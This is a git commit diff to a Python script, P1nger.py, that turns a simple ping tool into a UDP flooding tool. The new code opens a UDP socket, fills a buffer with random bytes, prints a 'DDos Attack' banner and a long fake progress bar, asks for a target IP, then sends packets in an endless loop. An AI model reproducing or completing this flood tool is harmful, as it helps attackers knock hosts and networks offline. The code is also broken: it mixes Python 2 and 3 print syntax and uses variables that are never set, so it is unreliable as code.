82f6506945a4a3899b9c27987ec3be40a0d5e3ed
DeaKenas <73515265+DeaKenas@users.noreply.github.com>
2021-05-13 17:58:47 -0700

    Update P1nger.py

--- P1nger.py
+++ P1nger.py
@@ -1,9 +1,27 @@
 #Feel free to look at all of the code which is only 43 lines and is pretty basic
 
-import colorama
+import sys
 import os
 import time
+import socket
+import random
+#Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDos Attack")
+print
 print("$$$$$$$\   $$\                                       ")
 print("$$  __$$\$$$$ |                                      ")
 print("$$ |  $$ \_$$ | $$$$$$$\  $$$$$$\  $$$$$$\  $$$$$$\  ")
@@ -16,26 +34,292 @@ print("                         $$\   $$ |                  ")
 print("                         \$$$$$$  |                  ")
 print("                          \______/                   ")
 print("Thanks for using my custom pinger!")
+print"By DeaKenas"
+print
+ip = raw_input("P1NGER Target   : ")
 
-def ipping():
-    os.system("cls")
-    count = 1
-    e = input("P1nger Target:   ")
-    replies = 0
-    replies += 1
-    hostname = e
-    os.system("cls")
-    print("-"*100)
-    print("="*100)
-    print("-"*100)
-    while True:
-        response = os.system("ping -n 1 " + hostname + " >nul")
-        if response == 0:
-            print("\033[1;32;40m" + hostname + " is being P1NGED" + " [" +  str(count) + "]" +  '\033[0m')
-        else:
-            print("\033[31m" + hostname + " offline" " [" +  str(count) + "]" +  '\033[0m')
-        count += 1
-        time.sleep(0)
-
-
-ipping()
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 0% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print ("[##=================================================================================================] 2% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[###=================================================================================================] 3% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[####================================================================================================] 4% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[#####==============================================================================================] 5% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[######==============================================================================================] 6% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[########============================================================================================] 7% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[########============================================================================================] 8% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[#########===========================================================================================] 9% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[##########==========================================================================================] 10% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 11% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 12% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 13% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 14% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 15% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 16% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 17% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 18% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 19% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 20% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 21% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 22% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 23% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 24% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 25% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 26% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 27% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 28% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 29% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 30% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 31% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 32% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 33% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 34% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 35% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 36% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 37% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 38% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 39% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 40% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 41% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 42% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 43% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 44% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 45% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 46% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 47% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 48% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 49% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 50% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 51% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 52% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 53% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 57% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 62% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 64% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 69% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 70% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 72% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 74% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 75% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 78% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 81% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 83% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 85% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 86% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 91% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 96% "
+time.sleep(0)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 99% "
+time.sleep(1)
+os.system("clear")
+os.system("P1NGER Session Starting")
+print "[====================================================================================================] 100% "
+time.sleep(0)
+while True:
+     sock.sendto(bytes, (ip,))
+     sent = sent + 1
+     port = port + 1
+     print "P1NGED %s packets to %s "%(sent,ip)
